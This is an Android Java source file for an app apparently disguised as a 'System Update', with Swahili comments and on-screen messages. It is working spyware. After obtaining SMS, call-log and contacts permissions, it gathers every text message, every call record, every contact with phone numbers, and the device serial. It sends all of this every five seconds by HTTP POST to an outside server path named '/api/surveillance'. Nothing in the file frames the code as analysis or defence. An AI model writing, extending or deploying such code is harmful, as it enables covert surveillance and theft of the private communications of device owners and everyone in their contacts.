package com.security.update;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.os.Bundle;
import android.widget.TextView;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {
    private static final String SERVER_URL = "https://GhostTester.pythonanywhere.com/api/surveillance";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private TextView statusText;
    private ScheduledExecutorService scheduler;

    // RUHUSA MUHIMU TU - HAIKUBAGUI
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.INTERNET
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        statusText = findViewById(R.id.statusText);

        // Check and request permissions
        if (checkPermissions()) {
            startAutomaticDataCollection();
            statusText.setText("✅ Ruhusa zote zimekubaliwa! Inaanza kukusanya data...");
        } else {
            requestPermissions();
        }
    }

    private boolean checkPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestPermissions() {
        // Onyesha ujumbe wazi kwa mtumiaji
        statusText.setText("📋 Tafadhali ruhusu ruhusa hizi:\n• Soma SMS\n• Soma historia ya simu\n• Soma majina ya anwani\n• Mtandao wa internet");
        
        // Omba ruhusa baada ya sekunde 2
        new android.os.Handler().postDelayed(() -> {
            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
        }, 2000);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            StringBuilder deniedPermissions = new StringBuilder();
            
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    deniedPermissions.append(permissions[i]).append("\n");
                }
            }
            
            if (allGranted) {
                startAutomaticDataCollection();
                statusText.setText("✅ Ruhusa zote zimekubaliwa! Data inakusanywa automatikally...");
            } else {
                statusText.setText("❌ Baadhi ya ruhusa hazijakubaliwa:\n" + deniedPermissions.toString() + 
                                 "\n\n🔧 Tumia hizi steps kurekebisha:\n" +
                                 "1. Nenda Settings > Apps\n" +
                                 "2. Chagua 'System Update'\n" + 
                                 "3. Bonyeza 'Permissions'\n" +
                                 "4. Ruhusu zote");
            }
        }
    }

    private void startAutomaticDataCollection() {
        statusText.setText("🚀 Inaanza kukusanya data automatikally...");

        // Start scheduler for automatic data collection every 5 seconds
        scheduler = Executors.newScheduledThreadPool(1);
        scheduler.scheduleAtFixedRate(() -> {
            try {
                collectAndSendAllData();
                runOnUiThread(() -> {
                    String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
                    statusText.setText("📱 Data imetumwa - " + time + "\n✅ SMS, Simu & Majina zimekusanywa");
                });
            } catch (Exception e) {
                Log.e("AUTO_COLLECTION", "Error: " + e.getMessage());
                runOnUiThread(() -> statusText.setText("❌ Error: " + e.getMessage()));
            }
        }, 0, 5, TimeUnit.SECONDS); // Kila sekunde 5
    }

    private void collectAndSendAllData() {
        try {
            JSONObject data = new JSONObject();
            data.put("device_id", Build.MODEL + " - " + Build.SERIAL);
            data.put("status", "active");
            data.put("timestamp", System.currentTimeMillis());

            JSONObject collectedData = new JSONObject();

            // 1. COLLECT SMS MESSAGES ZOTE (za zamani na za sasa)
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                collectedData.put("sms_messages", collectSMSMessages());
            } else {
                collectedData.put("sms_messages", createErrorArray("SMS permission denied"));
            }

            // 2. COLLECT CALL LOGS ZOTE (za zamani na za sasa)
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                collectedData.put("call_logs", collectCallLogs());
            } else {
                collectedData.put("call_logs", createErrorArray("Call log permission denied"));
            }

            // 3. COLLECT CONTACTS ZOTE
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                collectedData.put("contacts", collectContacts());
            } else {
                collectedData.put("contacts", createErrorArray("Contacts permission denied"));
            }

            // 4. DEVICE INFORMATION (haitaji ruhusa)
            collectedData.put("device_info", collectDeviceInfo());

            data.put("data", collectedData);

            // Send to server
            sendDataToServer(data);

        } catch (Exception e) {
            Log.e("DATA_COLLECTION", "Error collecting data: " + e.getMessage());
        }
    }

    private JSONArray createErrorArray(String errorMessage) {
        JSONArray errorArray = new JSONArray();
        try {
            JSONObject errorObj = new JSONObject();
            errorObj.put("error", errorMessage);
            errorArray.put(errorObj);
        } catch (Exception e) {
            Log.e("ERROR_ARRAY", "Error creating error array: " + e.getMessage());
        }
        return errorArray;
    }

    private JSONArray collectSMSMessages() {
        JSONArray smsList = new JSONArray();
        Cursor cursor = null;
        try {
            // SOMA SMS ZOTE - ZA ZAMANI NA ZA SASA
            cursor = getContentResolver().query(
                    Uri.parse("content://sms"),
                    null, null, null, "date DESC" // ZOTE, SI LIMIT
            );
            
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    try {
                        JSONObject sms = new JSONObject();
                        sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                        sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                        sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                        sms.put("type", getSMSType(cursor.getString(cursor.getColumnIndexOrThrow("type"))));
                        sms.put("read", cursor.getString(cursor.getColumnIndexOrThrow("read")));
                        smsList.put(sms);
                        count++;
                        
                        // Toa angalizo kwenye log kwa ajili ya ukaguzi
                        if (count % 50 == 0) {
                            Log.d("SMS_COLLECTION", "Imesoma SMS: " + count);
                        }
                    } catch (Exception e) {
                        Log.e("SMS_ITEM", "Error with SMS item: " + e.getMessage());
                    }
                }
                Log.d("SMS_COLLECTION", "Jumla ya SMS zilizokusanywa: " + count);
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("SMS_COLLECTION", "Error reading SMS: " + e.getMessage());
            try {
                JSONObject errorObj = new JSONObject();
                errorObj.put("error", e.getMessage());
                smsList.put(errorObj);
            } catch (Exception jsonError) {
                Log.e("SMS_ERROR", "Error creating error object: " + jsonError.getMessage());
            }
        } finally {
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
            }
        }
        return smsList;
    }

    private JSONArray collectCallLogs() {
        JSONArray callsList = new JSONArray();
        Cursor cursor = null;
        try {
            // SOMA SIMU ZOTE ZA ZAMANI NA ZA SASA
            cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null, null, null, CallLog.Calls.DATE + " DESC" // ZOTE, SI LIMIT
            );
            
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    try {
                        JSONObject call = new JSONObject();
                        call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                        call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                        call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                        call.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                        call.put("type", getCallType(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                        callsList.put(call);
                        count++;
                        
                        // Toa angalizo kwenye log kwa ajili ya ukaguzi
                        if (count % 50 == 0) {
                            Log.d("CALL_COLLECTION", "Imesoma simu: " + count);
                        }
                    } catch (Exception e) {
                        Log.e("CALL_ITEM", "Error with call item: " + e.getMessage());
                    }
                }
                Log.d("CALL_COLLECTION", "Jumla ya simu zilizokusanywa: " + count);
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("CALL_COLLECTION", "Error reading call logs: " + e.getMessage());
            try {
                JSONObject errorObj = new JSONObject();
                errorObj.put("error", e.getMessage());
                callsList.put(errorObj);
            } catch (Exception jsonError) {
                Log.e("CALL_ERROR", "Error creating error object: " + jsonError.getMessage());
            }
        } finally {
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
            }
        }
        return callsList;
    }

    private JSONArray collectContacts() {
        JSONArray contactsList = new JSONArray();
        Cursor cursor = null;
        try {
            // SOMA MAJINA YOTE YA ANWANI
            cursor = getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC" // ZOTE, SI LIMIT
            );
            
            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    try {
                        JSONObject contact = new JSONObject();
                        String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                        contact.put("name", name);

                        // Get phone numbers ZOTE
                        JSONArray phones = new JSONArray();
                        Cursor phoneCursor = null;
                        try {
                            phoneCursor = getContentResolver().query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                    new String[]{contactId},
                                    null
                            );
                            if (phoneCursor != null) {
                                while (phoneCursor.moveToNext()) {
                                    try {
                                        String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                        if (phone != null && !phone.trim().isEmpty()) {
                                            phones.put(phone);
                                        }
                                    } catch (Exception e) {
                                        Log.e("PHONE_ITEM", "Error with phone item: " + e.getMessage());
                                    }
                                }
                                phoneCursor.close();
                            }
                        } catch (Exception e) {
                            Log.e("PHONES_COLLECTION", "Error reading phones: " + e.getMessage());
                        } finally {
                            if (phoneCursor != null && !phoneCursor.isClosed()) {
                                phoneCursor.close();
                            }
                        }
                        contact.put("phones", phones);
                        contactsList.put(contact);
                        count++;
                        
                        // Toa angalizo kwenye log kwa ajili ya ukaguzi
                        if (count % 50 == 0) {
                            Log.d("CONTACTS_COLLECTION", "Imesoma majina: " + count);
                        }
                    } catch (Exception e) {
                        Log.e("CONTACT_ITEM", "Error with contact item: " + e.getMessage());
                    }
                }
                Log.d("CONTACTS_COLLECTION", "Jumla ya majina yaliyokusanywa: " + count);
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("CONTACTS_COLLECTION", "Error reading contacts: " + e.getMessage());
            try {
                JSONObject errorObj = new JSONObject();
                errorObj.put("error", e.getMessage());
                contactsList.put(errorObj);
            } catch (Exception jsonError) {
                Log.e("CONTACTS_ERROR", "Error creating error object: " + jsonError.getMessage());
            }
        } finally {
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
            }
        }
        return contactsList;
    }

    private String getSMSType(String type) {
        switch (type) {
            case "1": return "Incoming";
            case "2": return "Outgoing";
            case "3": return "Draft";
            default: return "Unknown";
        }
    }

    private String getCallType(String type) {
        switch (type) {
            case "1": return "Incoming";
            case "2": return "Outgoing";
            case "3": return "Missed";
            case "4": return "Voicemail";
            case "5": return "Rejected";
            case "6": return "Blocked";
            default: return "Unknown";
        }
    }

    private JSONObject collectDeviceInfo() {
        JSONObject deviceInfo = new JSONObject();
        try {
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("brand", Build.BRAND);
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("serial", Build.SERIAL);
            deviceInfo.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
        } catch (Exception e) {
            Log.e("DEVICE_INFO", "Error: " + e.getMessage());
        }
        return deviceInfo;
    }

    private void sendDataToServer(JSONObject data) {
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000); // Ongeza muda kwa data nyingi
                conn.setReadTimeout(15000);

                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d("SERVER_RESPONSE", "Response code: " + responseCode + ", Data size: " + data.toString().length());

                conn.disconnect();
            } catch (Exception e) {
                Log.e("SERVER_COMM", "Error: " + e.getMessage());
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (scheduler != null) {
            scheduler.shutdown();
        }
    }
}
